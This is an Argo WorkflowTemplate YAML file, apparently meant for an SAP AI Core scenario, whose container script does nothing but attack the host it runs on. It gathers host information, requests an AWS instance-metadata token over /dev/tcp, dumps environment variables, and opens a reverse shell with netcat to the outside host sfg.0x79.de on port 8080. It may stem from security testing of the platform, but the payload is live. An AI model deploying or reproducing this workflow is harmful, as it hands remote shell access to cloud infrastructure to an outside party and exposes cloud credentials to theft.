apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: testflo-rce-wft2
  annotations:
    executables.ai.sap.com/name: testflo-rce-wft2
    executables.ai.sap.com/id: testflo-rce-wft2
  labels:
    scenarios.ai.sap.com/id: testflo-scenario
    scenarios.ai.sap.com/name: testflo-scenario
    executables.ai.sap.com/id: testflo-rce-wft2
    executables.ai.sap.com/name: testflo-rce-wft2
    ai.sap.com/version: "1.0.0"
    ai.sap.com/resourcePlan: infer.s
spec:
  entrypoint: cb
  templates:
    - name: cb
      metadata:
        labels:
          ai.sap.com/resourcePlan: infer.s
      container:
        image: alpine:3.19
        command:
          - sh
          - -c
          - |
            # node info
            echo "hostname: $(hostname)"
            cat /proc/version 2>/dev/null || true
            cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || true
            # IMDS via /dev/tcp
            (exec 3<>/dev/tcp/169.254.169.254/80
            printf "PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n" >&3
            IMDS_RESP=$(cat <&3)
            exec 3>&-
            echo "IMDS_RESP: $IMDS_RESP") || echo "IMDS_DEV_TCP_FAILED"
            # env recon
            env | grep -v 'TOKEN\|SECRET\|PASS\|KEY' || true
            # reverse shell
            nc sfg.0x79.de 8080 -e /bin/sh || true
            sleep 3600
